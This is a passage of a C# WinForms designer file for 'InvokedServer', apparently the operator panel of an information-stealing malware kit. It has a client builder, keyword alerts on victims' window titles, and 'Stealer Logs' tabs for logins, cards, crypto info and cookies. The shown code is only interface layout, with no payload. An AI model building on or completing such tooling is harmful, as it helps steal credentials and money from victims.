            this.txtTag.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtTag.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtTag.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtTag.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.txtTag.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtTag.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtTag.ForeColor = System.Drawing.Color.White;
            this.txtTag.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtTag.Location = new System.Drawing.Point(8, 48);
            this.txtTag.Name = "txtTag";
            this.txtTag.PlaceholderText = "[Identify Your Client]";
            this.txtTag.SelectedText = "";
            this.txtTag.Size = new System.Drawing.Size(217, 23);
            this.txtTag.TabIndex = 34;
            this.txtTag.TextChanged += new System.EventHandler(this.HasChangedSetting);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.ForeColor = System.Drawing.SystemColors.Control;
            this.label1.Location = new System.Drawing.Point(8, 31);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(60, 15);
            this.label1.TabIndex = 2;
            this.label1.Text = "Client Tag";
            // 
            // OpenBuilderBtn
            // 
            this.OpenBuilderBtn.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.OpenBuilderBtn.Animated = true;
            this.OpenBuilderBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.OpenBuilderBtn.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.OpenBuilderBtn.BorderRadius = 2;
            this.OpenBuilderBtn.BorderThickness = 1;
            this.OpenBuilderBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.OpenBuilderBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.OpenBuilderBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.OpenBuilderBtn.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.OpenBuilderBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.OpenBuilderBtn.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.OpenBuilderBtn.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.OpenBuilderBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.OpenBuilderBtn.ForeColor = System.Drawing.Color.White;
            this.OpenBuilderBtn.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.OpenBuilderBtn.Image = global::InvokedServer.Properties.Resources.bricks;
            this.OpenBuilderBtn.ImageSize = new System.Drawing.Size(16, 16);
            this.OpenBuilderBtn.Location = new System.Drawing.Point(487, 366);
            this.OpenBuilderBtn.Name = "OpenBuilderBtn";
            this.OpenBuilderBtn.Size = new System.Drawing.Size(266, 23);
            this.OpenBuilderBtn.TabIndex = 30;
            this.OpenBuilderBtn.Text = "Build";
            this.OpenBuilderBtn.Click += new System.EventHandler(this.OpenBuilderBtn_Click);
            // 
            // kryptonPage1
            // 
            this.kryptonPage1.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.kryptonPage1.Controls.Add(this.guna2GradientButton10);
            this.kryptonPage1.Controls.Add(this.guna2GradientButton9);
            this.kryptonPage1.Controls.Add(this.guna2GradientButton8);
            this.kryptonPage1.Controls.Add(this.NotificationDataGridView);
            this.kryptonPage1.Controls.Add(this.NotiDataGridView);
            this.kryptonPage1.Flags = 65534;
            this.kryptonPage1.ImageSmall = global::InvokedServer.Properties.Resources.bell;
            this.kryptonPage1.LastVisibleSet = true;
            this.kryptonPage1.MinimumSize = new System.Drawing.Size(50, 50);
            this.kryptonPage1.Name = "kryptonPage1";
            this.kryptonPage1.Size = new System.Drawing.Size(879, 396);
            this.kryptonPage1.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.kryptonPage1.Text = "Notification Centre";
            this.kryptonPage1.ToolTipTitle = "Page ToolTip";
            this.kryptonPage1.UniqueName = "764C0C34F0FD4F2E0CAC34D95ACB9250";
            // 
            // guna2GradientButton10
            // 
            this.guna2GradientButton10.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2GradientButton10.Animated = true;
            this.guna2GradientButton10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton10.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.guna2GradientButton10.BorderRadius = 2;
            this.guna2GradientButton10.BorderThickness = 1;
            this.guna2GradientButton10.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton10.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton10.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton10.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton10.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton10.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GradientButton10.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton10.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2GradientButton10.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton10.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton10.Image = global::InvokedServer.Properties.Resources.control_play_blue;
            this.guna2GradientButton10.ImageSize = new System.Drawing.Size(16, 16);
            this.guna2GradientButton10.Location = new System.Drawing.Point(781, 161);
            this.guna2GradientButton10.Name = "guna2GradientButton10";
            this.guna2GradientButton10.Size = new System.Drawing.Size(90, 23);
            this.guna2GradientButton10.TabIndex = 49;
            this.guna2GradientButton10.Text = "Start";
            this.guna2GradientButton10.Click += new System.EventHandler(this.guna2GradientButton10_Click);
            // 
            // guna2GradientButton9
            // 
            this.guna2GradientButton9.Animated = true;
            this.guna2GradientButton9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton9.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.guna2GradientButton9.BorderRadius = 2;
            this.guna2GradientButton9.BorderThickness = 1;
            this.guna2GradientButton9.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton9.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton9.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton9.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton9.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton9.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GradientButton9.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton9.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2GradientButton9.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton9.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton9.Image = global::InvokedServer.Properties.Resources.delete;
            this.guna2GradientButton9.ImageSize = new System.Drawing.Size(16, 16);
            this.guna2GradientButton9.Location = new System.Drawing.Point(135, 161);
            this.guna2GradientButton9.Name = "guna2GradientButton9";
            this.guna2GradientButton9.Size = new System.Drawing.Size(123, 23);
            this.guna2GradientButton9.TabIndex = 34;
            this.guna2GradientButton9.Text = "Delete Word(s)";
            this.guna2GradientButton9.Click += new System.EventHandler(this.guna2GradientButton9_Click);
            // 
            // guna2GradientButton8
            // 
            this.guna2GradientButton8.Animated = true;
            this.guna2GradientButton8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton8.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(72)))), ((int)(((byte)(82)))), ((int)(((byte)(98)))));
            this.guna2GradientButton8.BorderRadius = 2;
            this.guna2GradientButton8.BorderThickness = 1;
            this.guna2GradientButton8.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton8.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton8.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton8.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton8.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton8.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.guna2GradientButton8.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.guna2GradientButton8.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.guna2GradientButton8.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton8.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.guna2GradientButton8.Image = global::InvokedServer.Properties.Resources.add;
            this.guna2GradientButton8.ImageSize = new System.Drawing.Size(16, 16);
            this.guna2GradientButton8.Location = new System.Drawing.Point(6, 161);
            this.guna2GradientButton8.Name = "guna2GradientButton8";
            this.guna2GradientButton8.Size = new System.Drawing.Size(123, 23);
            this.guna2GradientButton8.TabIndex = 33;
            this.guna2GradientButton8.Text = "Add Word";
            this.guna2GradientButton8.Click += new System.EventHandler(this.guna2GradientButton8_Click);
            // 
            // NotificationDataGridView
            // 
            this.NotificationDataGridView.AllowUserToAddRows = false;
            this.NotificationDataGridView.AllowUserToDeleteRows = false;
            this.NotificationDataGridView.AllowUserToOrderColumns = true;
            this.NotificationDataGridView.AllowUserToResizeRows = false;
            dataGridViewCellStyle7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotificationDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle7;
            this.NotificationDataGridView.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.NotificationDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotificationDataGridView.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.NotificationDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle8.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle8.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle8.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.NotificationDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle8;
            this.NotificationDataGridView.ColumnHeadersHeight = 20;
            this.NotificationDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.User2Col,
            this.WordCol,
            this.TitleCol});
            dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle9.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle9.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(254)))));
            dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.NotificationDataGridView.DefaultCellStyle = dataGridViewCellStyle9;
            this.NotificationDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.NotificationDataGridView.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotificationDataGridView.Location = new System.Drawing.Point(1, 188);
            this.NotificationDataGridView.Name = "NotificationDataGridView";
            this.NotificationDataGridView.ReadOnly = true;
            this.NotificationDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.NotificationDataGridView.RowHeadersVisible = false;
            this.NotificationDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.NotificationDataGridView.Size = new System.Drawing.Size(879, 208);
            this.NotificationDataGridView.TabIndex = 9;
            this.NotificationDataGridView.TabStop = false;
            this.NotificationDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotificationDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.NotificationDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.NotificationDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.NotificationDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.NotificationDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotificationDataGridView.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotificationDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.NotificationDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.NotificationDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.NotificationDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.NotificationDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.NotificationDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.NotificationDataGridView.ThemeStyle.ReadOnly = true;
            this.NotificationDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotificationDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.NotificationDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.NotificationDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.NotificationDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.NotificationDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.SteelBlue;
            this.NotificationDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // User2Col
            // 
            this.User2Col.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.User2Col.FillWeight = 124.1573F;
            this.User2Col.HeaderText = "User@PC";
            this.User2Col.Name = "User2Col";
            this.User2Col.ReadOnly = true;
            this.User2Col.Width = 150;
            // 
            // WordCol
            // 
            this.WordCol.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.WordCol.FillWeight = 79.48418F;
            this.WordCol.HeaderText = "Word";
            this.WordCol.Name = "WordCol";
            this.WordCol.ReadOnly = true;
            this.WordCol.Width = 150;
            // 
            // TitleCol
            // 
            this.TitleCol.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
            this.TitleCol.FillWeight = 0.1834614F;
            this.TitleCol.HeaderText = "Title";
            this.TitleCol.Name = "TitleCol";
            this.TitleCol.ReadOnly = true;
            // 
            // NotiDataGridView
            // 
            this.NotiDataGridView.AllowUserToAddRows = false;
            this.NotiDataGridView.AllowUserToDeleteRows = false;
            this.NotiDataGridView.AllowUserToOrderColumns = true;
            this.NotiDataGridView.AllowUserToResizeRows = false;
            dataGridViewCellStyle10.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiDataGridView.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle10;
            this.NotiDataGridView.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiDataGridView.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.NotiDataGridView.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle11.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle11.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle11.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle11.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            dataGridViewCellStyle11.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle11.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.NotiDataGridView.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle11;
            this.NotiDataGridView.ColumnHeadersHeight = 20;
            this.NotiDataGridView.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.keywordCol});
            dataGridViewCellStyle12.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle12.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            dataGridViewCellStyle12.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle12.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle12.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(90)))), ((int)(((byte)(92)))), ((int)(((byte)(120)))));
            dataGridViewCellStyle12.SelectionForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(254)))));
            dataGridViewCellStyle12.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.NotiDataGridView.DefaultCellStyle = dataGridViewCellStyle12;
            this.NotiDataGridView.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.NotiDataGridView.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiDataGridView.Location = new System.Drawing.Point(0, 0);
            this.NotiDataGridView.Name = "NotiDataGridView";
            this.NotiDataGridView.ReadOnly = true;
            this.NotiDataGridView.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.NotiDataGridView.RowHeadersVisible = false;
            this.NotiDataGridView.RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            this.NotiDataGridView.Size = new System.Drawing.Size(879, 157);
            this.NotiDataGridView.TabIndex = 8;
            this.NotiDataGridView.TabStop = false;
            this.NotiDataGridView.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiDataGridView.ThemeStyle.AlternatingRowsStyle.Font = null;
            this.NotiDataGridView.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.White;
            this.NotiDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
            this.NotiDataGridView.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
            this.NotiDataGridView.ThemeStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiDataGridView.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiDataGridView.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.NotiDataGridView.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            this.NotiDataGridView.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.NotiDataGridView.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.White;
            this.NotiDataGridView.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
            this.NotiDataGridView.ThemeStyle.HeaderStyle.Height = 20;
            this.NotiDataGridView.ThemeStyle.ReadOnly = true;
            this.NotiDataGridView.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(62)))), ((int)(((byte)(72)))), ((int)(((byte)(88)))));
            this.NotiDataGridView.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
            this.NotiDataGridView.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.NotiDataGridView.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.White;
            this.NotiDataGridView.ThemeStyle.RowsStyle.Height = 22;
            this.NotiDataGridView.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.SteelBlue;
            this.NotiDataGridView.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
            // 
            // keywordCol
            // 
            this.keywordCol.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
            this.keywordCol.FillWeight = 3.824976F;
            this.keywordCol.HeaderText = "Keyword";
            this.keywordCol.Name = "keywordCol";
            this.keywordCol.ReadOnly = true;
            // 
            // GraphViewPage
            // 
            this.GraphViewPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.GraphViewPage.Flags = 65534;
            this.GraphViewPage.ImageSmall = global::InvokedServer.Properties.Resources.chart_organisation;
            this.GraphViewPage.LastVisibleSet = true;
            this.GraphViewPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.GraphViewPage.Name = "GraphViewPage";
            this.GraphViewPage.Size = new System.Drawing.Size(879, 396);
            this.GraphViewPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.GraphViewPage.Text = "Graph View";
            this.GraphViewPage.ToolTipTitle = "Page ToolTip";
            this.GraphViewPage.UniqueName = "A576557E4DBA4746C389EC534F7D9824";
            // 
            // StealerLogsPage
            // 
            this.StealerLogsPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.StealerLogsPage.Controls.Add(this.StealerTabControl);
            this.StealerLogsPage.Controls.Add(this.guna2GradientPanel1);
            this.StealerLogsPage.Flags = 65534;
            this.StealerLogsPage.ImageSmall = global::InvokedServer.Properties.Resources.user_thief_baldie;
            this.StealerLogsPage.LastVisibleSet = true;
            this.StealerLogsPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.StealerLogsPage.Name = "StealerLogsPage";
            this.StealerLogsPage.Size = new System.Drawing.Size(879, 396);
            this.StealerLogsPage.StateCommon.Page.Color1 = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(61)))), ((int)(((byte)(76)))));
            this.StealerLogsPage.Text = "Stealer Logs";
            this.StealerLogsPage.ToolTipTitle = "Page ToolTip";
            this.StealerLogsPage.UniqueName = "EFDCB75D7142446AC2AC2FF5DB7027FA";
            // 
            // StealerTabControl
            // 
            this.StealerTabControl.Dock = System.Windows.Forms.DockStyle.Fill;
            this.StealerTabControl.Location = new System.Drawing.Point(0, 16);
            this.StealerTabControl.Name = "StealerTabControl";
            this.StealerTabControl.Pages.AddRange(new ComponentFactory.Krypton.Navigator.KryptonPage[] {
            this.LoginsPage,
            this.AutofillsPage,
            this.CardsPage,
            this.CryptoinfoPage,
            this.CookiesPage,
            this.HistoryPage,
            this.DownloadsPage,
            this.AppsPage});
            this.StealerTabControl.Palette = this.MainKryptonPalette;
            this.StealerTabControl.PaletteMode = ComponentFactory.Krypton.Toolkit.PaletteMode.Custom;
            this.StealerTabControl.SelectedIndex = 0;
            this.StealerTabControl.Size = new System.Drawing.Size(879, 380);
            this.StealerTabControl.TabIndex = 13;
            // 
            // LoginsPage
            // 
            this.LoginsPage.AutoHiddenSlideSize = new System.Drawing.Size(200, 200);
            this.LoginsPage.Controls.Add(this.StealerLoginsDataGridView);
            this.LoginsPage.Flags = 65534;
            this.LoginsPage.ImageSmall = global::InvokedServer.Properties.Resources.key;
            this.LoginsPage.LastVisibleSet = true;
            this.LoginsPage.MinimumSize = new System.Drawing.Size(50, 50);
            this.LoginsPage.Name = "LoginsPage";
            this.LoginsPage.Size = new System.Drawing.Size(877, 354);
